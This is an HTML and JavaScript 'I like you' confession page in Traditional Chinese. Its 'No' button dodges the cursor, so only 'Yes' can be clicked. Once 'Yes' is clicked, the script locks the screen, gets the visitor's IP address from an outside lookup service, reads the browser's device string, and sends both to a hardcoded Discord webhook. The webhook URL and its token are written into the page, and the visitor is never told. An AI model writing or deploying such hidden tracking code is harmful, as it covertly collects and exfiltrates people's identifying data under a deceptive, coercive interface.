<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>我喜歡你 💖</title>

<style>
body {
  margin: 0;
  height: 100vh;
  background: #0d1117;
  font-family: "微軟正黑體", Arial;
  overflow: hidden;
}

.card {
  width: 100%;
  height: 100vh;
  background: #1f2933;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  color: white;
  position: relative;
}

img {
  width: 100px;
  margin-bottom: 15px;
}

.title {
  font-size: 22px;
  text-align: center;
  line-height: 1.6;
}

.subtitle {
  font-size: 16px;
  color: #aaa;
}

.btn-area {
  position: relative;
  width: 300px;
  height: 200px;
  margin-top: 20px;
}

button {
  padding: 12px 25px;
  border: none;
  border-radius: 12px;
  font-size: 18px;
  cursor: pointer;
  position: absolute;
  transition: 0.2s;
}

.yes {
  background: #4CAF50;
  color: white;
}

.no {
  background: #ff4d4d;
  color: white;
}

/* 成功畫面 */
.success {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: radial-gradient(circle, #ff4d6d, #0d1117);
  display: flex;
  justify-content: center;
  align-items: center;
  flex-direction: column;
  opacity: 0;
  pointer-events: none;
  transition: 0.5s;
}

.success.show {
  opacity: 1;
  pointer-events: all;
}

.success h1 {
  font-size: 40px;
  color: white;
  animation: pop 0.5s ease;
}

@keyframes pop {
  0% { transform: scale(0); }
  100% { transform: scale(1); }
}

/* 愛心 */
.heart {
  position: absolute;
  font-size: 20px;
  animation: float 3s linear infinite;
}

@keyframes float {
  0% { transform: translateY(0); opacity: 1; }
  100% { transform: translateY(-300px); opacity: 0; }
}

/* 鎖定 */
.locked {
  pointer-events: none;
}
</style>
</head>

<body>

<div class="card">
  <img src="https://cdn-icons-png.flaticon.com/512/742/742751.png">

  <p class="title">
    我喜歡你 ❤️<br>
    <span class="subtitle">你願意跟我在一起嗎？ 😳</span>
  </p>

  <div class="btn-area" id="area">
    <button class="yes" id="yesBtn">願意</button>
    <button class="no" id="noBtn">不願意</button>
  </div>
</div>

<div class="success" id="success">
  <h1>我愛你 ❤️</h1>
</div>

<script>
const noBtn = document.getElementById("noBtn");
const yesBtn = document.getElementById("yesBtn");
const area = document.getElementById("area");
const success = document.getElementById("success");

let locked = false;

/* 初始位置 */
yesBtn.style.left = "40px";
yesBtn.style.top = "100px";

noBtn.style.left = "160px";
noBtn.style.top = "100px";

/* NO 逃跑 */
function moveAway(x, y) {
  if (locked) return;

  const rect = noBtn.getBoundingClientRect();
  const bx = rect.left + rect.width / 2;
  const by = rect.top + rect.height / 2;

  const dx = bx - x;
  const dy = by - y;
  const dist = Math.sqrt(dx * dx + dy * dy);

  if (dist < 120) {
    const maxX = area.clientWidth - noBtn.offsetWidth;
    const maxY = area.clientHeight - noBtn.offsetHeight;

    noBtn.style.left = Math.random() * maxX + "px";
    noBtn.style.top = Math.random() * maxY + "px";
  }
}

document.addEventListener("mousemove", e => moveAway(e.clientX, e.clientY));
document.addEventListener("touchmove", e => {
  moveAway(e.touches[0].clientX, e.touches[0].clientY);
});

/* 🌐 IP + 裝置 */
async function getInfo() {
  let ip = "unknown";
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    ip = (await res.json()).ip;
  } catch {}

  const device = navigator.userAgent;

  return { ip, device };
}

/* 💖 YES */
yesBtn.onclick = async () => {

  if (locked) return;
  locked = true;

  success.classList.add("show");

  area.classList.add("locked");
  yesBtn.disabled = true;
  noBtn.disabled = true;

  document.onmousemove = null;
  document.ontouchmove = null;

  const info = await getInfo();

  const webhookURL = "https://discord.com/api/webhooks/1492236169524674625/K4JOL-5_G46crVFSWO2S05m9DhJamM42P91kQb-GCPFu7v6CiSIOvQHByAxuo1eqLbCq";

  const embed = {
    username: "💌 告白系統",
    avatar_url: "https://cdn-icons-png.flaticon.com/512/742/742751.png",
    embeds: [
      {
        title: "💖 告白成功",
        description: "有人按下『願意』 ❤️",
        color: 0xff4d6d,

        fields: [
          {
            name: "🌐 IP",
            value: info.ip,
            inline: false
          },
          {
            name: "📱 裝置",
            value: info.device.slice(0, 80),
            inline: false
          },
          {
            name: "💘 狀態",
            value: "已鎖定畫面",
            inline: true
          }
        ],

        timestamp: new Date().toISOString()
      }
    ]
  };

  try {
    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(embed)
    });
  } catch (e) {}

  /* 💖 愛心動畫 */
  setInterval(() => {
    const heart = document.createElement("div");
    heart.className = "heart";
    heart.innerText = "💖";
    heart.style.left = Math.random() * 100 + "%";
    heart.style.top = "80%";
    document.body.appendChild(heart);

    setTimeout(() => heart.remove(), 3000);
  }, 200);
};
</script>

</body>
</html>
